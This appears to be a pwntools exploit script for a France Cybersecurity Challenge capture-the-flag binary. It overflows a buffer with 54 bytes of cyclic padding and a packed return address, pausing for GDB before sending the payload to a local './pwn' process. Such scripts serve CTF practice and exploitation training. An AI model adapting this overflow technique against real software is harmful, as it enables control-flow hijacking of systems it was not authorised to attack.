from pwn import *

#io = remote("challenges.france-cybersecurity-challenge.fr", 2050)

pl = cyclic(54)
#pl += p32(0x004011a2)
#pl += p32(0x0040205c)
pl += p32(0x00402108)

io = process("./pwn")
raw_input("attach GDB")
io.sendline(pl)
io.wait()
io.readuntil("foo")

print(io.readlineS(False))
